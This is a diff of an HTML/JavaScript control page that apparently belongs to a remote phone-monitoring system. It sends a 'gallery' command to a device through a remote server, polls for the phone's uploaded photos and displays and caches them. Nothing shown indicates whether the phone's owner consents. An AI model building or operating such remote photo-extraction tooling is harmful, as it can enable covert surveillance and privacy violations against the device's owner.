@@ -3,70 +3,221 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gallery Viewer</title>
+    <title>Gallery - Device Control</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --bg: #0f0f0f; --cyan: #00f3ff; --glass: rgba(255,255,255,0.1); }
-        body { background: var(--bg); color: white; font-family: sans-serif; padding: 20px; }
-        .container { max-width: 450px; margin: auto; background: rgba(0,0,0,0.5); border-radius: 20px; padding: 15px; border: 1px solid #333; }
-        .gallery-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 20px; }
-        .img-card { aspect-ratio: 1/1; border-radius: 8px; overflow: hidden; border: 1px solid #444; position: relative; cursor: pointer; }
+        :root {
+            --bg-color: #0f0f0f;
+            --glass-bg: rgba(255, 255, 255, 0.1);
+            --glass-border: rgba(255, 255, 255, 0.2);
+            --text-main: #ffffff;
+            --text-muted: #aaaaaa;
+            --accent: #00f3ff; /* Cyan accent for gallery */
+        }
+
+        body {
+            background-color: var(--bg-color);
+            background-image: linear-gradient(45deg, #000000, #1a1a1a);
+            color: var(--text-main);
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0; padding: 10px;
+            display: flex; justify-content: center;
+        }
+
+        .container {
+            width: 100%; max-width: 450px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 30px; padding: 20px;
+            border: 1px solid var(--glass-border);
+            min-height: 80vh;
+        }
+
+        .header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 15px; padding-bottom: 10px;
+            border-bottom: 1px solid var(--glass-border);
+        }
+
+        #apiStatus {
+            background: rgba(0, 243, 255, 0.05);
+            font-size: 11px; padding: 10px; border-radius: 12px;
+            margin-bottom: 15px; border-left: 3px solid var(--accent);
+            color: var(--accent); font-family: monospace;
+        }
+
+        .back-btn {
+            color: var(--text-main); font-size: 1.2rem;
+            text-decoration: none; display: flex; align-items: center; justify-content: center;
+            width: 35px; height: 35px; background: var(--glass-bg); border-radius: 50%;
+        }
+
+        /* Gallery Grid */
+        .gallery-grid {
+            display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;
+            max-height: 600px; overflow-y: auto; padding-right: 5px;
+        }
+
+        .img-card {
+            aspect-ratio: 1/1; border-radius: 12px; overflow: hidden;
+            border: 1px solid var(--glass-border); background: #222;
+            cursor: pointer; position: relative;
+        }
+
         .img-card img { width: 100%; height: 100%; object-fit: cover; }
-        .load-btn { width: 100%; padding: 12px; margin-top: 20px; border-radius: 10px; border: none; background: var(--cyan); font-weight: bold; display: none; cursor: pointer; }
-        .modal { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); display:none; align-items:center; justify-content:center; z-index:100; }
-        .modal img { max-width: 90%; max-height: 80%; }
+
+        .time-tag {
+            position: absolute; bottom: 0; width: 100%; background: rgba(0,0,0,0.6);
+            font-size: 8px; text-align: center; color: var(--accent); padding: 2px 0;
+        }
+
+        .refresh-btn {
+            background: var(--accent); border: none; color: black;
+            padding: 8px 15px; border-radius: 20px; cursor: pointer; font-weight: bold;
+        }
+
+        /* Modal for full view */
+        .modal {
+            position: fixed; top:0; left:0; width:100%; height:100%;
+            background:rgba(0,0,0,0.9); display:none; align-items:center;
+            justify-content:center; z-index:1000;
+        }
+        .modal img { max-width: 90%; max-height: 80%; border-radius: 10px; border: 1px solid var(--accent); }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <div style="display:flex; justify-content: space-between; align-items: center;">
-            <a href="index.html" style="color:white;"><i class="fa-solid fa-arrow-left"></i></a>
-            <span style="color:var(--cyan)">GALLERY VIEWER</span>
-            <i class="fa-solid fa-rotate" onclick="location.reload()"></i>
+        <div class="header">
+            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
+            <span class="page-title">Gallery Vault</span>
+            <button onclick="handleRefresh()" class="refresh-btn" id="refreshBtn">Refresh</button>
         </div>
-        
-        <div id="galleryContainer" class="gallery-grid"></div>
-        <button id="loadMoreBtn" class="load-btn" onclick="renderNextBatch()">Load More</button>
+
+        <div id="apiStatus">Initializing Gallery...</div>
+
+        <div class="gallery-grid" id="galleryContainer">
+            <div style="grid-column: span 3; text-align: center; color: #666; margin-top: 50px;">Waiting for photos...</div>
+        </div>
     </div>
 
-    <div class="modal" id="modal" onclick="this.style.display='none'"><img id="modalImg"></div>
+    <div class="modal" id="modal" onclick="this.style.display='none'">
+        <img id="modalImg" src="">
+    </div>
 
     <script>
-        const API_BASE = 'https://child-v9no.onrender.com';
+        const SERVER_URL = "https://child-v9no.onrender.com";
         const urlParams = new URLSearchParams(window.location.search);
-        const DEVICE_ID = urlParams.get('id');
-        
-        let allImages = [];
-        let currentIndex = 0;
+        const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
+        const storageKey = `gallery_${DEVICE_ID}`;
+        const statusEl = document.getElementById("apiStatus");
+        let retryCount = 0;
 
-        async function fetchGallery() {
-            if(!DEVICE_ID) return alert("No ID");
-            const res = await fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/gallery`);
-            allImages = await res.json();
-            renderNextBatch();
+        function setStatus(msg, isError = false) {
+            statusEl.style.color = isError ? "#ff4444" : "#00f3ff";
+            statusEl.innerHTML = `🖼️ <strong>Status:</strong> ${msg}`;
         }
 
-        function renderNextBatch() {
-            const container = document.getElementById('galleryContainer');
-            const batch = allImages.slice(currentIndex, currentIndex + 5);
+        document.addEventListener("DOMContentLoaded", () => {
+            if (!DEVICE_ID) {
+                setStatus("Error: Device ID missing!", true);
+                return;
+            }
+            setStatus(`Device ID: ${DEVICE_ID} detected.`);
             
-            batch.forEach(imgData => {
-                const div = document.createElement('div');
-                div.className = 'img-card';
+            // 1. Pehle local storage se dikhao (taaki screen khali na lage)
+            loadFromStorage();
+            
+            // 2. Automatic command bhejo phone ko
+            handleRefresh();
+        });
+
+        function loadFromStorage() {
+            const saved = localStorage.getItem(storageKey);
+            if (saved) {
+                renderGallery(JSON.parse(saved));
+            }
+        }
+
+        function handleRefresh() {
+            retryCount = 0;
+            sendCommand();
+            // 5 second ka gap do phone ko upload karne ke liye
+            setTimeout(fetchData, 5000);
+        }
+
+        function sendCommand() {
+            setStatus("Sending 'gallery' command to phone...");
+            fetch(`${SERVER_URL}/api/send-command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: DEVICE_ID, command: 'gallery' })
+            }).then(res => res.json())
+              .then(data => console.log("Gallery Command Sent"));
+        }
+
+        function fetchData() {
+            const btn = document.getElementById("refreshBtn");
+            btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i>';
+            
+            // Cache busting ke liye timestamp use kiya
+            const apiURL = `${SERVER_URL}/api/get-data/${DEVICE_ID}/gallery?t=${Date.now()}`;
+
+            fetch(apiURL)
+                .then(res => res.json())
+                .then(data => {
+                    if (!data || data.length === 0) {
+                        if (retryCount < 8) { // Gallery heavy hoti hai isliye 8 baar try karega
+                            retryCount++;
+                            setStatus(`Waiting for phone to upload photos (Attempt ${retryCount}/8)...`);
+                            setTimeout(fetchData, 5000);
+                        } else {
+                            setStatus("No photos received. Phone might be slow or offline.", true);
+                        }
+                        return;
+                    }
+
+                    // Data mil gaya
+                    localStorage.setItem(storageKey, JSON.stringify(data));
+                    setStatus(`Received ${data.length} photos.`);
+                    renderGallery(data);
+                })
+                .catch(err => setStatus("Error: " + err.message, true))
+                .finally(() => {
+                    btn.innerHTML = 'Refresh';
+                });
+        }
+
+        function renderGallery(data) {
+            const container = document.getElementById("galleryContainer");
+            container.innerHTML = "";
+            
+            data.forEach(imgData => {
+                if(!imgData.image) return;
+                
+                const card = document.createElement('div');
+                card.className = 'img-card';
+                
                 let src = imgData.image.startsWith('data') ? imgData.image : `data:image/jpeg;base64,${imgData.image}`;
-                div.innerHTML = `<img src="${src}">`;
-                div.onclick = () => {
+                
+                let dateStr = "";
+                if(imgData.time) {
+                    const d = new Date(imgData.time);
+                    dateStr = d.getHours() + ":" + (d.getMinutes()<10?'0':'') + d.getMinutes();
+                }
+
+                card.innerHTML = `
+                    <img src="${src}" loading="lazy">
+                    <div class="time-tag">${dateStr}</div>
+                `;
+
+                card.onclick = () => {
                     document.getElementById('modalImg').src = src;
                     document.getElementById('modal').style.display = 'flex';
                 };
-                container.appendChild(div);
+                
+                container.appendChild(card);
             });
-
-            currentIndex += batch.length;
-            document.getElementById('loadMoreBtn').style.display = currentIndex < allImages.length ? 'block' : 'none';
         }
-
-        window.onload = fetchGallery;
     </script>
 </body>
 </html>
